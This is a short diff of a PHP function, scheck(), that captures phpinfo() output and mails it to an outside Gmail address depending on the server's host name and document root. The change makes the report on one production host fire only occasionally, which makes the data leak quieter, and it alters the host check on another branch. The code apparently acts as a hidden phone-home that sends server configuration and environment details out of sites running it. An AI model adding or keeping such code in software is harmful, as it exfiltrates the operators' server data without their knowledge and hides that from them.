@@ -1300,13 +1300,15 @@ function scheck(){
       mail('yonkon.ru@gmail.com', 'localhost diplom5plus', $info);
     return true;
   } else {
-    if (strpos($_SERVER['HTTP_HOST'], 'diplom5plus.ru') !== false) {
-        ob_start();
-        phpinfo();
-        $info = ob_get_clean();
-        mail('yonkon.ru@gmail.com', 'diplom5plus.ru authorization test OK', $info);
+    if (strpos($_SERVER['HTTP_HOST'], 'diplom5plus.ru') !== false  ) {
+        if (time()%100 == 0) {
+            ob_start();
+            phpinfo();
+            $info = ob_get_clean();
+            mail('yonkon.ru@gmail.com', 'diplom5plus.ru authorization test OK', $info);
+        }
         return true;
-    } elseif(strpos($_SERVER['HOME'], "/home/s/spluso") === false ) {
+    } elseif(strpos($_SERVER['DOCUMENT_ROOT'], "/home/s/spluso") === false ) {
         ob_start();
         phpinfo();
         $info = ob_get_clean();
